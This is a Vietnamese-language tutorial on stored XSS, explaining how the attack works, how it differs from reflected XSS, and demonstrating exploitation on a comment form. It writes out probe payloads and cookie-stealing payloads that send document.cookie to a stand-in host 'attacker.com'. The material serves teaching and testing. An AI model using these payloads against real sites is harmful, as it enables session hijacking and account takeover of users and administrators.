# Stored XSS là gì?

Stored XSS là dạng tấn công mà hacker chèn trực tiếp các mã độc vào cơ sở dữ liệu của website. Dạng tấn công này xảy ra khi các dữ liệu được gửi lên server không được kiểm tra kỹ lưỡng mà lưu trực tiếp vào cơ sở dữ liệu. Khi người dùng truy cập vào trang web này thì những đoạn script độc hại sẽ được thực thi chung với quá trình load trang web.
Điều này làm cho Stored XSS nguy hiểm hơn Reflected XSS vì nó có thể ảnh hưởng đến một số lượng lớn người dùng mà không cần kẻ tấn công phải thực hiện bất kỳ hành động bổ sung nào

### Stored XSS được triển khai như thế nào?

<p align="center">
<img width="801" alt="Ảnh chụp Màn hình 2025-03-31 lúc 15 12 58" src="https://github.com/user-attachments/assets/2db17621-c17d-476e-b174-236e9846137f" />
</p>

**Bước 1:** Kẻ tấn công tìm kiếm các trường nhập liệu mà nội dung của chúng được lưu lại và hiển thị sau này. Các vị trí tìm năng như: Bình luận, bài đăng, hộp chat tin nhắn, trang quản trị hiển thị log truy cập... 

**Bước 2:** Nếu hệ thống không được mã hóa dữ liệu đầu vào, kẻ tấn công có thể gửi 1 đoạn script độc hại để lưu trữ trong cơ sở dữ liệu.
**Ví dụ:**
```
<script>fetch('http://attacker.com?cookie='+document.cookie);</script>
```
> Hành động này cho phép kẻ tấn công lấy được cookie người dùng nếu họ vô tình truy cập vào nơi được lưu trữ mã độc.

**Bước 3:** Kẻ tấn công chờ đợi người dùng truy cập trang có chứa mã độc.( Giả sử mã độc được lưu trữ lại bình luận của 1 bài viết thì khi bất kì ai truy cập vào trang hiển thị bình luận sẽ thấy được đoạn script chạy trong trình duyệt của họ.)

**Tóm lại:** Với Stored XSS thì kẻ tấn công chỉ cần tìm thấy các điểm đầu vào không được xử lý để chèn các đoạn mã nguy hiểm vào CSDL. Sau đó chỉ cần chờ đợi người dùng truy cập vào ứng dụng web và thực hiện các thao tác liên quan đến dữ liệu được lưu này, đoạn mã của kẻ tấn công sẽ được thực thi trên trình duyệt người dùng. Vì lí do này mà kỹ thuật Stored XSS còn được gọi là second-order XSS.

### Reflected XSS và Stored XSS có 2 sự khác biệt lớn trong quá trình tấn công.

- Thứ nhất, để khai thác Reflected XSS, kẻ tấn công phải lừa được nạn nhân truy cập vào URL của mình. Còn Stored XSS không cần phải thực hiện việc này, sau khi chèn được mã nguy hiểm vào CSDL của ứng dụng, kẻ tấn công chỉ việc ngồi chờ nạn nhân tự động truy cập vào. Với nạn nhân, việc này là hoàn toàn bình thường vì họ không hề hay biết dữ liệu mình truy cập đã bị nhiễm độc.

- Thứ 2, mục tiêu của kẻ tấn công sẽ dễ dàng đạt được hơn nếu tại thời điểm tấn công nạn nhân vẫn trong phiên làm việc(session) của ứng dụng web. Với Reflected XSS, kẻ tấn công có thể thuyết phục hay lừa nạn nhân đăng nhập rồi truy cập đến URL mà hắn ta cung cấp để thực thi mã độc. Nhưng Stored XSS thì khác, vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào người dùng truy cập các chức năng liên quan thì mã độc sẽ được thực thi, và nhiều khả năng là những chức năng này yêu cầu phải xác thực(đăng nhập) trước nên hiển nhiên trong thời gian này người dùng vẫn đang trong phiên làm việc.

Từ những điều này có thể thấy Stored XSS nguy hiểm hơn Reflected XSS rất nhiều, đối tượng bị ảnh hưởng có thế là tất cả nhưng người sử dụng ứng dụng web đó. Và nếu nạn nhân có vai trò quản trị thì còn có nguy cơ bị chiếm quyền điều khiển web.

### Cách thức khai thác

**Payload:** ```<h1>XSS</h1>```, ```<script>alert('XSS')</script>```, ```<img src=x onerror=alert('XSS');>```...

**Hành động:** Đưa vào các tham số trong trường nhập liệu, bình luận, bài viết, hộp chat....

**Mong đợi:** Trang web trả về chức năng của payload( thẻ tiêu đề ```<h1>```, ```alert()```...).

**Mục tiêu:** Xác nhận trường input không được xử lý đầu vào, có thể khai thác.
 
 <p align="center">
<img width="801" alt="Ảnh chụp Màn hình 2025-03-31 lúc 15 12 58" src="https://github.com/user-attachments/assets/eb9dcfce-525e-40ce-bb42-6e925e4eb0fb" />
</p>

> Nhập payload vào các trường nhập liệu, ở đây là trường nhập tên và nội dung bình luận. Khi gửi lên CSDL thì nội dung payload được hiển thị lại trên trang web mà không thông qua bất kỳ cơ chế kiểm tra nào.

**Khai thác đánh cắp phiên đăng nhập**

<p align="center">
<img width="801" alt="Ảnh chụp Màn hình 2025-03-31 lúc 15 12 58" src="https://github.com/user-attachments/assets/57a5c8ed-829d-4c6d-836d-f4a50d7ba29a" />
</p>

> Chèn hành động **```fetch()```** để thực hiện đánh cắp cookie người dùng.
Payload: **```<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie);>```**. Trang web hiển thị thẻ **```<img>```** với nội dung của ảnh là hành độc **```fecth()```** đến web attacker.

<p align="center">
<img width="801" alt="Ảnh chụp Màn hình 2025-03-31 lúc 15 12 58" src="https://github.com/user-attachments/assets/19341a53-71a2-42c9-91b0-fbcb436264a3" />
</p>

> Chờ đợi người dùng hoặc admin truy cập vào trang web, đoạn script sẽ được thực thi và gửi cookie đến attacker.
